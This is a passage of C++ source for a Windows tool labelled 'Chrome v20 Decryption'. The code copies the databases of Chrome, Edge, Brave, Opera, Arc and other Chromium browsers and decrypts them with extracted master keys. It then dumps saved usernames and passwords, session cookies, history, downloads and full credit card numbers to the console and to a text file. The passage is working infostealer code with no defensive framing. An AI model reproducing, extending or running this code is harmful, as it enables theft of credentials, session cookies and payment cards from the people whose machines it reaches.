    std::string cardsDbPath = profilePath + "\\Web Data";
    
    // Check if file exists
    DWORD attribs = GetFileAttributesA(cardsDbPath.c_str());
    if (attribs == INVALID_FILE_ATTRIBUTES) {
        return cards;
    }
    
    std::string tempDbPath = std::string(getenv("TEMP")) + "\\chrome_webdata_temp_" + std::to_string(GetTickCount()) + ".db";
    
    if (!CopyFileA(cardsDbPath.c_str(), tempDbPath.c_str(), FALSE)) {
        return cards;
    }
    
    sqlite3* db;
    if (sqlite3_open(tempDbPath.c_str(), &db) != SQLITE_OK) {
        DeleteFileA(tempDbPath.c_str());
        return cards;
    }
    
    const char* query = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards";
    sqlite3_stmt* stmt;
    
    if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileA(tempDbPath.c_str());
        return cards;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        CreditCardData card;
        
        const unsigned char* name = sqlite3_column_text(stmt, 0);
        const unsigned char* month = sqlite3_column_text(stmt, 1);
        const unsigned char* year = sqlite3_column_text(stmt, 2);
        const void* numberBlob = sqlite3_column_blob(stmt, 3);
        int numberLen = sqlite3_column_bytes(stmt, 3);
        card.date_modified = sqlite3_column_int64(stmt, 4);
        
        if (name) card.name = reinterpret_cast<const char*>(name);
        if (month) card.month = reinterpret_cast<const char*>(month);
        if (year) card.year = reinterpret_cast<const char*>(year);
        
        if (numberBlob && numberLen > 0) {
            std::vector<BYTE> encryptedNumber(
                static_cast<const BYTE*>(numberBlob),
                static_cast<const BYTE*>(numberBlob) + numberLen
            );
            card.number = DecryptPassword(encryptedNumber, masterKey);
        }
        
        // Only add if we have required fields
        if (!card.name.empty() && !card.number.empty()) {
            cards.push_back(card);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileA(tempDbPath.c_str());
    
    return cards;
}

int main() {
    std::cout << "=== Chrome v20 Decryption C++ ===" << std::endl;
    std::cout << "Ported from C# version" << std::endl;
    std::cout << "Using Windows native APIs only (BCrypt, NCrypt, DPAPI)" << std::endl << std::endl;
    
    if (!IsAdmin()) {
        std::cerr << "Error: Not running as Administrator!" << std::endl;
        std::cerr << "This program must be run as Administrator to decrypt Chrome data." << std::endl;
        std::cout << "\nPress Enter to exit...";
        std::cin.get();
        return 1;
    }
    
    std::string localAppData = getenv("LOCALAPPDATA");
    std::string roamingAppData = getenv("APPDATA");
    
    // Define browsers to check (same as C# version)
    struct BrowserInfo {
        std::string name;
        std::string path;
        int encryptionType;  // 0 = v10, 1 = v20, 2 = v20_2
    };
    
    std::vector<BrowserInfo> browsers = {
        {"Google Chrome", localAppData + "\\Google\\Chrome\\User Data", 1},
        {"Google Chrome Beta", localAppData + "\\Google\\Chrome Beta\\User Data", 1},
        {"Google Chrome Dev", localAppData + "\\Google\\Chrome Dev\\User Data", 1},
        {"Google Chrome Canary", localAppData + "\\Google\\Chrome SxS\\User Data", 0},
        {"Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data", 2},
        {"Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data", 2},
        {"Vivaldi", localAppData + "\\Vivaldi\\User Data", 0},
        {"Opera", roamingAppData + "\\Opera Software\\Opera Stable", 0},
        {"Opera GX", roamingAppData + "\\Opera Software\\Opera GX Stable", 0},
        {"Chromium", localAppData + "\\Chromium\\User Data", 0},
        {"Arc", localAppData + "\\Packages\\TheBrowserCompany.Arc_ttt1ap7aakyb4\\LocalCache\\Local\\Arc\\User Data", 0},
    };
    
    std::vector<std::string> profiles = {
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5"
    };
    
    std::vector<LoginData> allLogins;
    std::vector<CookieData> allCookies;
    std::vector<HistoryData> allHistory;
    std::vector<DownloadData> allDownloads;
    std::vector<CreditCardData> allCards;
    
    // Process each browser
    for (const auto& browser : browsers) {
        // Check if browser exists
        DWORD attribs = GetFileAttributesA(browser.path.c_str());
        if (attribs == INVALID_FILE_ATTRIBUTES || !(attribs & FILE_ATTRIBUTE_DIRECTORY)) {
            continue;
        }
        
        std::cout << "[*] Processing " << browser.name << "..." << std::endl;
        
        // Get master key
        std::string localStatePath = browser.path + "\\Local State";
        std::vector<BYTE> masterKey;
        
        if (browser.encryptionType == 1) {
            // v20
            masterKey = GetV20MasterKey(localStatePath);
            if (masterKey.empty()) {
                masterKey = GetV10MasterKey(localStatePath);
            }
        } else if (browser.encryptionType == 2) {
            // v20_2
            masterKey = GetV20_2MasterKey(localStatePath);
            if (masterKey.empty()) {
                masterKey = GetV10MasterKey(localStatePath);
            }
        } else {
            // v10
            masterKey = GetV10MasterKey(localStatePath);
        }
        
        if (masterKey.empty()) {
            std::cout << "    [-] Failed to get master key" << std::endl;
            continue;
        }
        
        std::cout << "    [+] Got master key (" << masterKey.size() << " bytes)" << std::endl;
        
        // Process each profile
        for (const auto& profile : profiles) {
            std::string profilePath = browser.path + "\\" + profile;
            
            DWORD profileAttribs = GetFileAttributesA(profilePath.c_str());
            if (profileAttribs == INVALID_FILE_ATTRIBUTES || !(profileAttribs & FILE_ATTRIBUTE_DIRECTORY)) {
                continue;
            }
            
            std::cout << "    [*] Profile: " << profile << std::endl;
            
            // Get logins
            auto logins = GetLoginData(profilePath, masterKey);
            if (!logins.empty()) {
                std::cout << "        [+] Found " << logins.size() << " login(s)" << std::endl;
                allLogins.insert(allLogins.end(), logins.begin(), logins.end());
            }
            
            // Get cookies
            auto cookies = GetCookies(profilePath, masterKey);
            if (!cookies.empty()) {
                std::cout << "        [+] Found " << cookies.size() << " cookie(s)" << std::endl;
                allCookies.insert(allCookies.end(), cookies.begin(), cookies.end());
            }
            
            // Get history
            auto history = GetHistory(profilePath);
            if (!history.empty()) {
                std::cout << "        [+] Found " << history.size() << " history item(s)" << std::endl;
                allHistory.insert(allHistory.end(), history.begin(), history.end());
            }
            
            // Get downloads
            auto downloads = GetDownloads(profilePath);
            if (!downloads.empty()) {
                std::cout << "        [+] Found " << downloads.size() << " download(s)" << std::endl;
                allDownloads.insert(allDownloads.end(), downloads.begin(), downloads.end());
            }
            
            // Get credit cards
            auto cards = GetCreditCards(profilePath, masterKey);
            if (!cards.empty()) {
                std::cout << "        [+] Found " << cards.size() << " credit card(s)" << std::endl;
                allCards.insert(allCards.end(), cards.begin(), cards.end());
            }
        }
        
        std::cout << std::endl;
    }
    
    // Display results
    std::cout << "\n=== RESULTS ===" << std::endl << std::endl;
    
    // Save to file
    std::string outputFile = "chrome_decrypted_data.txt";
    std::ofstream outFile(outputFile);
    
    if (!outFile.is_open()) {
        std::cerr << "Failed to create output file!" << std::endl;
    } else {
        outFile << "=== Chrome v20 Decryption Results ===" << std::endl;
        outFile << "Generated: " << __DATE__ << " " << __TIME__ << std::endl << std::endl;
    }
    
    // Logins
    if (!allLogins.empty()) {
        std::cout << "--- Login Data (" << allLogins.size() << " total) ---" << std::endl;
        if (outFile.is_open()) {
            outFile << "--- Login Data (" << allLogins.size() << " total) ---" << std::endl << std::endl;
        }
        
        for (const auto& login : allLogins) {
            std::cout << "URL: " << login.url << std::endl;
            std::cout << "Username: " << login.username << std::endl;
            std::cout << "Password: " << login.password << std::endl;
            std::cout << std::endl;
            
            if (outFile.is_open()) {
                outFile << "URL: " << login.url << std::endl;
                outFile << "Username: " << login.username << std::endl;
                outFile << "Password: " << login.password << std::endl;
                outFile << std::endl;
            }
        }
    } else {
        std::cout << "--- No Login Data Found ---" << std::endl << std::endl;
        if (outFile.is_open()) {
            outFile << "--- No Login Data Found ---" << std::endl << std::endl;
        }
    }
    
    // Cookies
    if (!allCookies.empty()) {
        std::cout << "--- Cookie Data (" << allCookies.size() << " total) ---" << std::endl;
        if (outFile.is_open()) {
            outFile << "--- Cookie Data (" << allCookies.size() << " total) ---" << std::endl << std::endl;
        }
        
        for (const auto& cookie : allCookies) {
            std::cout << "Host: " << cookie.host << std::endl;
            std::cout << "Name: " << cookie.name << std::endl;
            std::cout << "Path: " << cookie.path << std::endl;
            std::cout << "Value: " << cookie.value << std::endl;
            std::cout << "Expires: " << cookie.expires << std::endl;
            std::cout << std::endl;
            
            if (outFile.is_open()) {
                outFile << "Host: " << cookie.host << std::endl;
                outFile << "Name: " << cookie.name << std::endl;
                outFile << "Path: " << cookie.path << std::endl;
                outFile << "Value: " << cookie.value << std::endl;
                outFile << "Expires: " << cookie.expires << std::endl;
                outFile << std::endl;
            }
        }
    } else {
        std::cout << "--- No Cookies Found ---" << std::endl << std::endl;
        if (outFile.is_open()) {
            outFile << "--- No Cookies Found ---" << std::endl << std::endl;
        }
    }
    
    // History
    if (!allHistory.empty()) {
        std::cout << "--- History Data (" << allHistory.size() << " total) ---" << std::endl;
        if (outFile.is_open()) {
            outFile << "--- History Data (" << allHistory.size() << " total) ---" << std::endl << std::endl;
        }
        
        for (const auto& item : allHistory) {
            std::cout << "URL: " << item.url << std::endl;
            std::cout << "Title: " << item.title << std::endl;
            std::cout << "Timestamp: " << item.timestamp << std::endl;
            std::cout << std::endl;
            
            if (outFile.is_open()) {
                outFile << "URL: " << item.url << std::endl;
                outFile << "Title: " << item.title << std::endl;
                outFile << "Timestamp: " << item.timestamp << std::endl;
                outFile << std::endl;
            }
        }
    } else {
        std::cout << "--- No History Found ---" << std::endl << std::endl;
        if (outFile.is_open()) {
            outFile << "--- No History Found ---" << std::endl << std::endl;
        }
    }
    
    // Downloads
    if (!allDownloads.empty()) {
        std::cout << "--- Download Data (" << allDownloads.size() << " total) ---" << std::endl;
        if (outFile.is_open()) {
            outFile << "--- Download Data (" << allDownloads.size() << " total) ---" << std::endl << std::endl;
        }
        
        for (const auto& item : allDownloads) {
            std::cout << "URL: " << item.tab_url << std::endl;
            std::cout << "Path: " << item.target_path << std::endl;
            std::cout << std::endl;
            
            if (outFile.is_open()) {
                outFile << "URL: " << item.tab_url << std::endl;
                outFile << "Path: " << item.target_path << std::endl;
                outFile << std::endl;
            }
        }
    } else {
        std::cout << "--- No Downloads Found ---" << std::endl << std::endl;
        if (outFile.is_open()) {
            outFile << "--- No Downloads Found ---" << std::endl << std::endl;
        }
    }
    
    // Credit Cards
    if (!allCards.empty()) {
        std::cout << "--- Credit Card Data (" << allCards.size() << " total) ---" << std::endl;
        if (outFile.is_open()) {
            outFile << "--- Credit Card Data (" << allCards.size() << " total) ---" << std::endl << std::endl;
        }
        
        for (const auto& card : allCards) {
            std::cout << "Name: " << card.name << std::endl;
            std::cout << "Month: " << card.month << std::endl;
            std::cout << "Year: " << card.year << std::endl;
            std::cout << "Number: " << card.number << std::endl;
            std::cout << "Date Modified: " << card.date_modified << std::endl;
            std::cout << std::endl;
            
            if (outFile.is_open()) {
                outFile << "Name: " << card.name << std::endl;
                outFile << "Month: " << card.month << std::endl;
                outFile << "Year: " << card.year << std::endl;
                outFile << "Number: " << card.number << std::endl;
                outFile << "Date Modified: " << card.date_modified << std::endl;
                outFile << std::endl;
            }
        }
    } else {
        std::cout << "--- No Credit Cards Found ---" << std::endl << std::endl;
        if (outFile.is_open()) {
            outFile << "--- No Credit Cards Found ---" << std::endl << std::endl;
        }
    }
    
    if (outFile.is_open()) {
        outFile.close();
        std::cout << "\n[+] Results saved to: " << outputFile << std::endl;
    }
    
    std::cout << "\n=== Done ===" << std::endl;
    std::cout << "\nPress Enter to exit...";
    std::cin.get();
    return 0;
}
